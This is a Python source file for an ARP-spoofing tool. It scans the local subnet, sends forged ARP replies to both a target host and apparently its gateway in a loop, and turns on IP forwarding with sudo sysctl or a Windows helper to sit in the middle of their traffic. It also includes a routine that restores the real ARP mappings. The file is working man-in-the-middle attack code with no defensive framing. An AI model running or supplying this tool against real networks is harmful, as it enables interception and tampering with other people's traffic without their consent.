import windows
import os
import scapy.all as scapy
import time

settings = {}


with open("puller.settings", "r") as f:
    for line in f.readlines():
        settings_name, setting = line.split(" ")
        settings[settings_name.strip()] = setting.strip()

def recieve_interface():
    if os.name == "posix":
        cmd = "ip a | grep \"state UP\" | awk -F: '{print $2}' | tr -d ' '"
        interfaces = os.popen(cmd).read()
        interfaces = str(interfaces).split()
        count = 0

        return interfaces
    elif os.name == "nt":
        return windows.recieve_interface()
    else:
        return "Invalid operating system"

def RecieveHosts(Subnet):
    import scapy.all as scapy

    Local_Host_Info = {}

    # Validate and convert to /24 network
    parts = Subnet.split(".")
    if len(parts) != 4:
        return {}  # invalid IP
    network = ".".join(parts[:3]) + ".0/24"

    try:
        results = scapy.arping(network, verbose=0)[0]
        for sent, received in results:
            Local_Host_Info[received.psrc] = received.hwsrc
    except Exception as e:
        print("ARP scan failed:", e)
        return {}

    return Local_Host_Info

# -----------------------
# packet spoofer
# -----------------------
def ARP_PacketSpoofer(tip, tmac, spoofip, Router=None):
    if Router is None:
        pkt = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=spoofip)
        scapy.send(pkt, verbose=0)
        scapy.send(pkt, verbose=0)
        del pkt
    else:
        pkt = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=spoofip, hwsrc=Router)
        scapy.send(pkt, verbose=0)
        scapy.send(pkt, verbose=0)



# ------------------------
# Packet sender
# ------------------------
def Packet_Sender(Target_IP, Target_Mac, Spoofip, SpoofMAC, Router_MAC, stop, reset_arp=False):
    if reset_arp is False:
        while str(stop).split()[3] == "unset>":
            try:
                ARP_PacketSpoofer(Target_IP, Target_Mac, Spoofip)
                ARP_PacketSpoofer(Spoofip, SpoofMAC, Target_IP)
                time.sleep(2)
            except:
                break
    if reset_arp is True:
        for l in range(1,3):
            ARP_PacketSpoofer(Target_IP, Target_Mac, Spoofip, Router_MAC)
            ARP_PacketSpoofer(Spoofip, SpoofMAC, Target_IP, Router_MAC)
            time.sleep(2)

# ------------------------
# Traffic Fowarding
# ------------------------
def Allow_ipv4_fowarding(status, interface):
    ##0 off
    ##1 on
    if os.name == "posix":
        if settings["mobile"] == "no":
            with os.popen("sudo sysctl net.ipv4.ip_forward") as status_:
                if status_.read().strip() == "net.ipv4.ip_forward = 0":

                    if status == 1:
                        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
            if status == 0:
                os.system("sudo sysctl -w net.ipv4.ip_forward=0")

            del status
            del status_
    elif os.name == "nt":
        if status == 1:
            windows.enable_ipv4_forwarding_win(interface, 1)
        if status == 0:
            windows.enable_ipv4_forwarding_win(interface, 0)


#f.write(f"interface {settings['interface']}\nsubnet {settings['subnet']}\nconsole {settings['console']}\nconsole_port {settings['console_port']}\nmobile {settings['mobile']}")
